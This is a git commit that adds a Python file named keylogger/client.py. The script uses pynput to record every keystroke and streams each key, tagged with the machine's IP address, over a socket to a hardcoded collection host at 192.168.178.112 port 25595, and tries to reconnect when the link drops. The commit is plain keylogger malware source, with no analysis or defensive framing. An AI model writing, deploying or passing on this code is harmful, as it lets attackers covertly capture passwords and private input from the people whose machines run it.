3250f5d644c21b67c6d9d3def12ff4b2a0be7c59
etheboi <123627006+etheboi@users.noreply.github.com>
2024-03-16 11:02:18 +0000

    Add files via upload

---
+++ assets/keylogger/client.py
@@ -0,0 +1,25 @@
+import pynput
+from pynput.keyboard import Key, Listener
+import socket
+from time import sleep
+
+hostname = socket.gethostname()
+ip = socket.gethostbyname(hostname)
+
+s = socket.socket()
+s.connect(("192.168.178.112", 25595))
+
+def on_press(key):
+    try:
+        s.send(f"{ip} {key}".encode())
+    except:
+        s.close()
+        while True:
+            try:
+                s.connect(("192.168.178.112", 25595))
+            except:
+                pass
+
+
+with Listener(on_press=on_press) as Listener:
+    Listener.join()
